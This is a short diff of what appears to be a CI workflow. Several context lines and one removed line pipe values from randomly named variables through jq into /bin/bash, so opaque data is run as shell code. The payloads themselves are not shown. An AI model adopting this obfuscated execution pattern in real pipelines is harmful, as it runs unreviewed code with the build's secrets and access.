@@ -36,7 +36,6 @@ jobs:
           echo $cp0 | jq -r .zqep3 | /bin/bash
           echo $awuf73 | jq -r .bame683 | /bin/bash
           echo $usen00288 | jq -r .r77650 | /bin/bash
-          printf '%s' "$nxg89284" | jq -r .m01 | /bin/bash
           printf '%s' "$zhrqi5" | jq -r .jzux1892 | /bin/bash
 
       - name: Upload artifact
